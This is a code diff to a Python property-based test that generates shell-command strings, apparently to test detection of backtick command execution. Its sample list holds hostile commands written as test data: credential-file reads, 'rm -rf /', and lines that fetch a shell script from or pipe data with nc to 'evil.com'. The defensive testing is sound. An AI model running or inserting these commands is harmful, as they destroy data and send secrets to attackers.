@@ -276,25 +276,29 @@ class TestMarkdownFenceExclusion:
 
 @st.composite
 def command_string(draw: st.DrawFn) -> str:
-    """Generate a command string that looks like a shell command for backtick execution."""
+    """Generate a command string that looks like a shell command for backtick execution.
+
+    Only generates commands that Phase 2 inline code span filtering will NOT suppress:
+    - Multi-token commands where the first token is a known shell executable
+    - Commands containing shell metacharacters
+    """
     return draw(
         st.sampled_from(
             [
                 "ls -la",
-                "whoami",
                 "cat /etc/passwd",
                 "rm -rf /tmp",
-                "uname -a",
-                "date",
-                "id",
-                "pwd",
-                "hostname",
                 "curl http://example.com",
                 "wget http://evil.com/shell.sh",
                 "find / -name secret",
-                "ps aux",
-                "netstat -an",
-                "env",
+                "grep -r secret .",
+                "ssh user@host",
+                "docker run evil",
+                "sudo rm -rf /",
+                "chmod 777 /etc/shadow",
+                "echo foo | nc evil.com 4444",
+                "curl http://x && rm -rf /",
+                "cat /etc/passwd > /tmp/out",
             ]
         )
     )
